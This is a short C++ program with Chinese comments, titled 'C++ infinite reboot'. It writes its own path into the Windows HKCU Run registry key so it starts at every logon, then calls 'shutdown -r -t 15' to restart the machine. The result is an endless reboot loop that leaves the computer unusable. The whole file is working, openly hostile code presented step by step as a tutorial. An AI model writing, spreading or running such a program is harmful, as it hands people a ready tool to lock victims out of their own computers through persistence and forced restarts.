#include <iostream>
#include <graphics.h>
#include <Windows.h>

using namespace std;

int main() {
	SetWindowText(GetHWnd(), "C++无限重启");

	// 1.打开注册表
	HKEY hKey;
	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	// 参数分别为路径，选项，权限，注册表钥匙

	// 2.自动获取程序路径
	TCHAR szInfo[260] = "";
	GetModuleFileName(NULL, szInfo, 260);
	// 设置路径为相对路径

	// 3.往注册表里写入数据（设置开机自启动）
	RegSetValueEx(
		hKey,			// 注册表句柄
		"无限重启",		// 注册表键上显示内容
		0,				// 保留，必须为0
		REG_SZ,			// 数据类型，此处表示字符串类型，sz
		(BYTE*)szInfo,	// 写入注册表的信息
		260				// 写入注册表的数据大小
	);

	// 4.重启电脑
	system("shutdown -r -t 15");
	// 设置计划关机

	return 0;
}